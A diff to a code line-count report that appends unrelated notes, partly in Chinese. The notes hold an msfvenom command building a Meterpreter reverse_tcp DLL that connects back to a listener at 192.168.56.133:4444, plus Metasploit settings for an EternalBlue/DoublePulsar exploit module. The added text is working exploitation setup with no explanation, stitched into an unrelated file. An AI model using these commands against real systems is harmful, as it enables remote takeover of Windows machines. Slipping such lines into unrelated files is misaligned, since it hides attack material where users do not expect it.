@@ -107,3 +107,23 @@ Dockerfile                       1              2              2              6
 D                                2              0              0              2
 -------------------------------------------------------------------------------
 SUM:                           312           4311           3492          69653
+
+
+
+
+# doub
+启动SSH服务
+命令为：
+/etc/init.d/ssh start
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.133 lport=4444 -f dll -o ~/eternal11.dll
+
+
+set payload payload/windows/meterpreter/reverse_tcp
+
+set winepath /home/kali/           ----- - Writing DLL in /home/kali/eternal11.dll
+
+
+  set DOUBLEPULSARPATH  /home/kali/Eternalblue-Doublepulsar-Metasploit-master-master/Eternalblue-Doublepulsar-Metasploit-master/deps
+
+  set ETERNALBLUEPATH /home/kali/Eternalblue-Doublepulsar-Metasploit-master-master/Eternalblue-Doublepulsar-Metasploit-master/deps
